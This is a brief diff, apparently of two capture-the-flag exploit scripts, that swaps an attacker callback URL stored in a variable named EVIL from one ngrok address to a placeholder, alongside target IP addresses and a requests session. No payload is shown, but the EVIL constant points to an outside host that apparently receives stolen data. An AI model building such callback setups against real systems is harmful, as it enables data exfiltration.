@@ -59,7 +59,7 @@ import raw_request
 
 URL = "http://34.170.146.252:19843/"
 # URL = "http://localhost:3000/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 
 s = requests.session()
@@ -186,7 +186,7 @@ import requests
 
 # URL = "http://34.170.146.252:54728/"
 URL = "http://localhost:3000/"
-EVIL = "https://tchenio.ngrok.io/"
+EVIL = "https://xxx.ngrok.app/"
 
 s = requests.session()
 cur = "A"
